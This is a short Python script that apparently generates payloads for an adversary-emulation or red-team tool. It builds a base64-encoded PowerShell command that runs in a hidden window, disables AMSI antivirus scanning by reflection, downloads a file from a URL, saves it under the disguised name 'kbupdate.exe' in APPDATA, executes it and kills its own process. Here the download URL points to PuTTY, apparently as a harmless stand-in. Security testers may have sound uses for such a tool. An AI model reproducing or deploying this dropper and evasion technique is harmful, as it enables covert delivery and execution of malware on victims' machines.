import base64

def get_payloads():
    template = '''powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path  $env:APPDATA + '\localfilename') {Remove-Item  $env:APPDATA + '\localfilename'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'user_agent'; $OEKQD.DownloadFile('my_download_url', $env:APPDATA + '\localfilename'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\localfilename'); Stop-Process -Id $Pid -Force'''

    my_download_url = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
    my_user_agent = 'EMT-KL'
    my_local_file_name = 'kbupdate.exe'

    payload = template.replace('localfilename', my_local_file_name)
    payload = payload.replace('my_download_url', my_download_url)
    payload = payload.replace('user_agent', my_user_agent)

    encoded_payload = base64.b64encode(bytearray(payload, encoding='UTF-8')).decode('UTF-8')

    return [encoded_payload]  # always return a list - limit the list to one entry if you want to choose a specific
                              # payload instead of a random one

#  run this script directly to see what you will return for payloads


if __name__ == '__main__':
    for i in get_payloads():
        print(base64.b64decode(i))
